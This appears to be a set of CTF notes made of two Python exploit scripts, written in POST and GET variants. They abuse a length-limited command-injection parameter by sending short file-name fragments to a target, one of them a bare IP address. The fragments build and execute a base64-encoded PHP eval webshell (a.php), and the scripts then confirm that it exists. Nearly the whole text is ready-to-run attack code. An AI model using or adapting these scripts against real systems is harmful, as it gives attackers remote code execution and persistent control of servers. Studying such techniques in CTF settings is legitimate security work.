### [[四字符RCE]]
```python
import requests
import time
 
url = "http://106.53.172.234:7799/"
 
payload = [
'>\\ \\',
'>-t\\',
'>\\>a',
'>ls\\',
'ls>v',
'>mv',
'>vt',
'*v*',
'>ls',
'l*>t',
'>cat',
'*t>z',
 
'>php',
'>a.\\',
'>\\>\\',
'>-d\\',
'>\\ \\',
'>64\\',
'>se\\',
'>ba\\',
'>\\|\\',
'>4=\\',
'>Pz\\',
'>k7\\',
'>XS\\',
'>sx\\',
'>VF\\',
'>dF\\',
'>X0\\',
'>gk\\',
'>bC\\',
'>Zh\\',
'>ZX\\',
'>Ag\\',
'>aH\\',
'>9w\\',
'>PD\\',
'>S}\\',
'>IF\\',
'>{\\',
'>\\$\\',
'>ho\\',
'>ec\\',
 
 
'sh z',
'sh a'
]
 
def writeFile(payload):
    data={
    "cmd":payload
    }
    requests.post(url,data=data)
 
def run():
    for p in payload:
        writeFile(p.strip())
        print("[*] create "+p.strip())
        time.sleep(1)
 
def check():
    response = requests.get(url+"a.php")
    if response.status_code == requests.codes.ok:
        print("[*] Attack success!!!Webshell is "+url+"a.php")
 
def main():
    run()
    check()
 
if __name__ == '__main__':
    main()
```
## get型
```python
import requests
import time

url = "http://node6.anna.nssctf.cn:26932/"

payload = [
    '>\\ \\',
    '>-t\\',
    '>\\>a',
    '>ls\\',
    'ls>v',
    '>mv',
    '>vt',
    '*v*',
    '>ls',
    'l*>t',
    '>cat',
    '*t>z',
    '>php',
    '>a.\\',
    '>\\>\\',
    '>-d\\',
    '>\\ \\',
    '>64\\',
    '>se\\',
    '>ba\\',
    '>\\|\\',
    '>4=\\',
    '>Pz\\',
    '>k7\\',
    '>XS\\',
    '>sx\\',
    '>VF\\',
    '>dF\\',
    '>X0\\',
    '>gk\\',
    '>bC\\',
    '>Zh\\',
    '>ZX\\',
    '>Ag\\',
    '>aH\\',
    '>9w\\',
    '>PD\\',
    '>S}\\',
    '>IF\\',
    '>{\\',
    '>\\$\\',
    '>ho\\',
    '>ec',
    'sh z',
    'sh a'
]

# 发送GET请求，传递cmd参数
def send_get_request(cmd):
    # 将cmd作为URL参数传递
    full_url = f"{url}?cmd={cmd}"
    response = requests.get(full_url)
    if response.status_code == requests.codes.ok:
        print(f"[*] Sent: {cmd}")
    else:
        print(f"[*] Failed to send: {cmd}")

# 执行攻击
def run():
    for p in payload:
        send_get_request(p.strip())  # 发送每个命令
        print("[*] create " + p.strip())
        time.sleep(1)

# 检查攻击是否成功
def check():
    response = requests.get(url + "a.php")
    if response.status_code == requests.codes.ok:
        print("[*] Attack success!!! Webshell is " + url + "a.php")

# 主程序入口
def main():
    run()
    check()

if __name__ == '__main__':
    main()

```
